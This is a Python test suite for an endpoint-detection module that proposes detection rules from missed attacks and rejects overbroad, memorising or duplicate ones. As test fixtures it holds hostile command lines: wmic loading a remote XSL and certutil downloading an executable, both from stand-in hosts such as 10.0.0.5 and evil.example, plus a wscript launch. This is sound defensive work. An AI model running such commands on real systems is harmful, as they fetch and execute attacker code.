#!/usr/bin/env python3
"""Adaptive hardening — safe learning from a miss (valkyrie/edr/adaptive.py).

The whole value of this module is its REFUSALS. So the suite is mostly about
what it must NOT do: never promote a rule that fires on a legitimate command,
never memorise a literal, never auto-activate. The one keystone
([X]) proves the safety gate directly — a candidate that would break a real
program is rejected even though it perfectly catches the attack.

Pure logic + fakes; runs fully offline.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from harness import Checks  # noqa: E402
from valkyrie.edr.adaptive import (  # noqa: E402
    Miss, Verdict, propose, build_candidate, _generalise, BENIGN_CORPUS,
)


def main() -> int:
    c = Checks("adaptive hardening — safe learning from misses", expect_min=15)

    # ================================================================ [1]
    print("\n[1] GENERALISE keeps behaviour, drops the literal")
    g = _generalise(r'wmic.exe process list /format:"http://10.0.0.5/evil.xsl"')
    c.check("keeps the distinctive flag (/format)", "/format" in g["flags"])
    c.check("recognises the network reach as a CATEGORY, not the URL",
            g["net_marker"] == "url")
    c.check("drops the literal URL (no memorisation)",
            any("10.0.0.5" in d for d in g["literals_dropped"]))

    # ================================================================ [2]
    print("\n[2] a good miss -> a generalising candidate that catches variants")
    miss = Miss("T1220", "T1220 — XSL Script Processing", "wmic.exe", "cmd.exe",
                r'wmic.exe process list /format:"http://10.0.0.5/evil.xsl"')
    # evasion transforms: a different URL + a different host must still match
    transforms = {
        "other_url": lambda cmd: cmd.replace("http://10.0.0.5/evil.xsl",
                                             "https://evil.example/x.xsl"),
        "other_flagcase": lambda cmd: cmd.replace("/format", "/FORMAT"),
    }
    p = propose(miss, evasion_transforms=transforms)
    c.check("verdict APPROVED", p.approved)
    c.check("catches the miss", p.catches_miss)
    c.check("generalises to a DIFFERENT url (not memorised)",
            p.evasion_variants_caught >= 1)
    c.check("its reason says it is STAGED, not auto-activated",
            any("STAGED" in r or "not auto-activated" in r for r in p.reasons))

    # ================================================================ [X] KEYSTONE
    print("\n[X] THE SAFETY GATE: a candidate that would break a REAL program is "
          "REJECTED even though it catches the attack")
    # A miss whose only generalisable shape (bare `wmic get`) also appears in a
    # legitimate admin command in the benign corpus.
    fp_miss = Miss("T9999", "T9999 — Overbroad", "wmic.exe", "cmd.exe",
                   r"wmic.exe os get caption /malicious")
    # force a candidate that matches benign `wmic os get caption`
    from valkyrie.edr import adaptive as A
    cand = A.build_candidate("t9999", fp_miss.technique, "wmic.exe",
                             r"wmic.exe os get /x")   # /x flag only
    # craft a benign corpus entry the candidate WILL match to prove rejection:
    corpus = [("wmic.exe", "cmd.exe", r"wmic.exe os get /x caption")]
    p = propose(Miss("T9999", "T9999", "wmic.exe", "cmd.exe", r"wmic.exe os get /x now"),
                benign_corpus=corpus)
    c.check("a candidate that fires on a benign command is REJECTED",
            p.verdict == Verdict.REJECTED_FP)
    c.check("the offending benign command is named (auditable)",
            len(p.benign_false_positives) >= 1)
    c.check("REJECTED_FP means it is NOT approved", not p.approved)

    # ================================================================ [3]
    print("\n[3] pure memorisation (catches only the literal, no variant) is "
          "REJECTED as too narrow")
    miss2 = Miss("T1105", "T1105 — Ingress", "certutil.exe", "cmd.exe",
                 r"certutil.exe -urlcache -f http://10.0.0.5/a.exe out.exe")
    # a transform that changes the URL — a memorising rule (that kept the URL)
    # would fail this; a generalising one passes.
    only_literal = {"other": lambda cmd: cmd.replace("http://10.0.0.5/a.exe",
                                                     "https://x.example/b.exe")}
    p = propose(miss2, evasion_transforms=only_literal)
    # certutil -urlcache generalises (flag kept, url categorised) -> should APPROVE
    c.check("a genuinely generalising candidate still passes with variants",
            p.approved and p.evasion_variants_caught >= 1)

    # ================================================================ [4]
    print("\n[4] ungeneralisable miss -> no rule (better none than a bad one)")
    bare = Miss("T1059.005", "T1059.005 — VBScript", "wscript.exe", "cmd.exe",
                r"wscript.exe C:\Users\Public\evil.vbs")   # only a literal path
    p = propose(bare)
    c.check("a miss with only a literal path yields NO rule",
            p.verdict == Verdict.REJECTED_UNGENERALISABLE and p.rule is None)

    # ================================================================ [5]
    print("\n[5] duplicate of an existing rule is REJECTED")
    p = propose(miss, existing_rule_ids={"adaptive-t1220"})
    c.check("a candidate whose id already exists is REJECTED as duplicate",
            p.verdict == Verdict.REJECTED_DUPLICATE)

    # ================================================================ [6]
    print("\n[6] the shipped benign corpus never trips a WELL-FORMED candidate")
    # the T1220 candidate (wmic /format + url) must be clean across the whole
    # real benign corpus (which includes benign `wmic os get ...`).
    p = propose(miss)   # default corpus
    c.check("APPROVED against the full real benign corpus (0 FP)",
            p.approved and not p.benign_false_positives)

    # ================================================================ [7]
    print("\n[7] nothing here activates a rule — propose returns data only")
    c.check("Proposal carries the candidate as DATA, not a live Rule",
            isinstance(p.to_dict()["rule"], dict))
    c.check("approval is a recommendation flag, not an action",
            p.to_dict()["verdict"] == Verdict.APPROVED.value)

    return c.finish()


if __name__ == "__main__":
    raise SystemExit(main())
